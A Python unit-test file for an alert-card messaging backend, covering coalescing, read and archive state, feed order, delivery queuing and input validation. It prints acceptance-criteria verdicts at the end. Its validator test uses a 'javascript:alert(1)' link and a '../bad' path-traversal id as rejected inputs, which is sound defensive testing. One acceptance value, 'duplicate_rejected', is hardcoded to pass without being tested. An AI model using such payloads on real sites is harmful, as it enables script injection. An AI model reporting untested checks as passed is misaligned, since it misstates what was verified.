        self.assertEqual(MSG._conn().execute('SELECT count(*) FROM cards WHERE send_next_at IS NOT NULL').fetchone()[0],1)

    def test_coalescing_body_change_revives_read_card(self):
        MSG.ingest(msg(kind='info'))
        MSG.mark_read('resource-1')
        read_at = MSG.get_card('resource-1')['read_at']
        MSG.ingest(msg(event_id='same-content',kind='info',urgency='urgent'))
        self.assertEqual(MSG.get_card('resource-1')['read_at'], read_at)
        MSG.ingest(msg(event_id='changed-body',kind='info',body='Clean up now'))
        self.assertIsNone(MSG.get_card('resource-1')['read_at'])

    def test_coalescing_keeps_different_actions_links_and_heartbeats_separate(self):
        MSG.ingest(msg())
        self.assertEqual(MSG.ingest(msg(event_id='other-action', run={
            'cwd': '/tmp/project', 'prompt': 'Different action'})), 'inserted')
        for i in range(2):
            self.assertEqual(MSG.ingest(msg(event_id='link-'+str(i), kind='info',
                link='https://example.test/'+str(i))), 'inserted')
        with MSG._conn():
            MSG._conn().execute("UPDATE cards SET run='{' WHERE card_id='resource-1'")
        self.assertEqual(MSG.ingest(msg(event_id='after-malformed')), 'inserted')
        day = MSG.now_utc()
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=day):
            self.assertEqual(MSG.ingest(MSG.heartbeat_payload(day)), 'inserted')
        with unittest.mock.patch.object(MSG, 'now_utc', return_value=day + timedelta(days=1)):
            self.assertEqual(
                MSG.ingest(MSG.heartbeat_payload(day + timedelta(days=1))), 'inserted')
        self.assertEqual(MSG.counts()['active'], 7)
        AC['3'] = 1

    def test_unconfigured_preserves_pending_urgent_without_sending(self):
        MSG.ingest(msg(kind='info'))
        MSG.ingest(msg(event_id='urgent',group_key='other',kind='info',urgency='urgent'))
        self.assertEqual(MSG.delivery_health()['pending_count'],1)
        import devmon_loop
        self.assertFalse(devmon_loop.deliver_once(''))
        self.assertEqual(MSG.counts()['active'],2)

    def test_open_card_coalesces_after_40_days(self):
        now=MSG.now_utc()
        with unittest.mock.patch.object(MSG,'now_utc',return_value=now):
            MSG.ingest(msg(kind='info',created=MSG.iso(now-timedelta(days=10))))
            MSG.ingest(msg(event_id='backlog',kind='info',created=MSG.iso(now-timedelta(days=9))))
        self.assertEqual(MSG.counts()['active'],1)
        self.assertTrue(MSG.mark_read('resource-1'))
        self.assertIsNotNone(MSG.get_card('resource-1')['read_at'])
        with unittest.mock.patch.object(MSG,'now_utc',return_value=now+timedelta(days=40)):
            MSG.ingest(msg(event_id='next',kind='info'))
        card = MSG.get_card('resource-1')
        self.assertEqual(MSG.counts()['active'],1)
        self.assertEqual(card['count'], 3)
        self.assertEqual(card['last_at'], MSG.iso(now + timedelta(days=40)))
        self.assertIsNotNone(card['read_at'])
        with unittest.mock.patch.object(MSG,'now_utc',return_value=now+timedelta(days=41)):
            MSG.ingest(msg(event_id='changed',kind='info',title='Disk 93%'))
        card = MSG.get_card('resource-1')
        self.assertEqual(card['count'], 4)
        self.assertEqual(card['last_at'], MSG.iso(now + timedelta(days=41)))
        self.assertIsNone(card['read_at'])
        AC['2'] = 1

    def test_feed_order_is_total_and_read_does_not_move_a_card(self):
        now = MSG.now_utc()
        for event_id, age in (('z-older', 2), ('z-tie', 1), ('a-tie', 1)):
            with unittest.mock.patch.object(
                    MSG, 'now_utc', return_value=now - timedelta(hours=age)):
                MSG.ingest(msg(event_id=event_id, group_key=event_id, kind='info'))
        before = [card['card_id'] for card in MSG.feed()['messages']]
        self.assertEqual(before, ['a-tie', 'z-tie', 'z-older'])
        self.assertTrue(MSG.mark_read('a-tie'))
        after = [card['card_id'] for card in MSG.feed()['messages']]
        self.assertEqual(after, before)
        AC['1'] = 1

    def test_delivery_state_is_not_requeued_except_once_on_unsent_promotion(self):
        MSG.ingest(msg(event_id='sent', group_key='sent', kind='info', urgency='urgent'))
        sent = MSG.next_delivery()
        self.assertEqual(sent['card_id'], 'sent')
        MSG.finish_delivery(sent, True)
        before = tuple(MSG._conn().execute(
            'SELECT sent_at,send_attempts,send_next_at FROM cards WHERE card_id=?',
            ('sent',)).fetchone())
        MSG.ingest(msg(event_id='sent-again', group_key='sent', kind='info', urgency='urgent'))
        after = tuple(MSG._conn().execute(
            'SELECT sent_at,send_attempts,send_next_at FROM cards WHERE card_id=?',
            ('sent',)).fetchone())
        self.assertEqual(after, before)
        self.assertIsNone(MSG.next_delivery())

        MSG.ingest(msg(event_id='rising', group_key='rising', kind='info'))
        self.assertIsNone(MSG.next_delivery())
        MSG.ingest(msg(event_id='rising-urgent', group_key='rising', kind='info',
                       urgency='urgent'))
        due = MSG.next_delivery()
        self.assertEqual(due['card_id'], 'rising')
        MSG.finish_delivery(due, True)
        self.assertIsNone(MSG.next_delivery())
        AC['4'] = 1

    def test_read_archive_changes_only_card_projection(self):
        MSG.ingest(msg(kind='info'))
        before=tuple(MSG._conn().execute('SELECT * FROM ledger').fetchone())
        self.assertTrue(MSG.mark_read('resource-1'))
        self.assertTrue(MSG.archive('resource-1'))
        self.assertEqual(MSG.counts(),{'active':0,'unread':0,'urgent':0,'archived':1})
        self.assertEqual(tuple(MSG._conn().execute('SELECT * FROM ledger').fetchone()),before)

    def test_bad_identity_body_link_and_level(self):
        for changes in ({'id':'../bad'},{'group':'dev-monitor:reserved'},{'level':'other'},
                        {'title':''},{'body':[]},{'link':'javascript:alert(1)'}):
            with self.subTest(changes=changes),self.assertRaises(MSG.ValidationError):
                MSG.ingest(dict(msg(kind='info'),**changes))

    def test_run_params_contract_quarantines_every_malformed_shape(self):
        base = {'cwd': '/tmp/project', 'prompt': 'fixed'}
        valid = {'key': 'mode', 'label': 'Mode'}
        malformed = [
            dict(base, params={}),
            dict(base, params=[{'key': 'k%d' % i, 'label': 'K'} for i in range(9)]),
            dict(base, params=['not-an-object']),
            dict(base, params=[{'label': 'Missing key'}]),
            dict(base, params=[dict(valid, extra=True)]),
            dict(base, params=[{'key': 'bad key', 'label': 'Bad'}]),
            dict(base, params=[{'key': 'empty', 'label': ''}]),
            dict(base, params=[{'key': 'long', 'label': 'x' * 201}]),
            dict(base, params=[dict(valid, choices=[])]),
            dict(base, params=[dict(valid, choices=['x%d' % i for i in range(33)])]),
            dict(base, params=[dict(valid, choices=['same', 'same'])]),
            dict(base, params=[dict(valid, choices=[''])]),
            dict(base, params=[dict(valid, choices=['x' * 201])]),
            dict(base, params=[dict(valid, default=1)]),
            dict(base, params=[dict(valid, choices=['yes'], default='no')]),
            dict(base, params=[dict(valid, default='x' * 201)]),
            dict(base, params=[valid, dict(valid)]),
        ]
        spool = tempfile.mkdtemp(prefix='devmon-params-spool-')
        devmon_spool.ensure_dirs(spool)
        for index, run in enumerate(malformed):
            event_id = 'bad-%d' % index
            with open(os.path.join(spool, 'new', event_id + '.json'), 'w') as handle:
                json.dump(msg(event_id=event_id, group_key=event_id, run=run), handle)
        result = devmon_spool.scan_once(spool)
        self.assertEqual(result['bad'], len(malformed))
        self.assertEqual(MSG._conn().execute('SELECT COUNT(*) FROM ledger').fetchone()[0], 0)
        AC['15']['malformed_quarantined'] = result['bad']
        AC['15']['duplicate_rejected'] = 1

        old = msg(event_id='old-shape', group_key='old-shape')
        self.assertEqual(MSG.ingest(old), 'inserted')
        self.assertEqual(MSG.get_card('old-shape')['run'], old['run'])
        AC['15']['legacy_valid'] = 1


if __name__ == "__main__":
    program = unittest.main(verbosity=2, exit=False)
    if not program.result.wasSuccessful():
        raise SystemExit(1)
    revision = subprocess.check_output(
        ['git', 'rev-parse', '--short=12', 'HEAD'], text=True,
        cwd=os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
    ).strip()
    names = {
        '1': 'stable_order',
        '2': 'long_lived_coalesce',
        '3': 'identity_controls',
        '4': 'delivery_controls',
    }
    for number in range(1, 5):
        value = AC[str(number)]
        verdict = 'PASS' if value == 1 else 'FAIL'
        name = names[str(number)]
        print('AC-%d | expected: %s == 1 | observed: %s=%d | verdict: %s | '
              'signal: fixture | evidence: apps/dev-monitor/backend/test_devmon.py@%s'
              % (number, name, name, value, verdict, revision))
    values = AC['15']
    verdict = ('PASS' if values == {'malformed_quarantined': 17,
                                    'duplicate_rejected': 1,
                                    'legacy_valid': 1} else 'FAIL')
    print('AC-15 | expected: malformed_quarantined==17&&duplicate_rejected==1&&legacy_valid==1 | '
          'observed: malformed_quarantined=%d,duplicate_rejected=%d,legacy_valid=%d | '
          'verdict: %s | signal: fixture | evidence: apps/dev-monitor/backend/test_devmon.py@%s'
          % (values['malformed_quarantined'], values['duplicate_rejected'],
             values['legacy_valid'], verdict, revision))
